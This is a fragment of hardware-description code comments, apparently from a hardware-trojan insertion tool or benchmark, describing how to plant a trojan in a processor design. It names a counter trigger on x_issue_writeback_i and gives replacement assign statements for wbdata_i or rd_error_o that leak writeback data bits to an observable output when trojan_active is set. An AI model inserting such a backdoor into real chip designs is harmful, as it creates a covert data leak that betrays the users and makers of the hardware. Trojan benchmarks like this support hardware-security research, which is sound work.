 ...
 *   
 * Trigger: Counter on x_issue_writeback_i
 * Payload: Route wbdata_i[0] to observable output
 * 
...
//   Find the assign for wbdata_i (or rd_error_o as fallback):
//     assign wbdata_i = <normal_expr>;
//   Replace with:
//     assign wbdata_i = trojan_active ? x_issue_writeback_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? x_issue_writeback_i[0] : 1'b0;
//
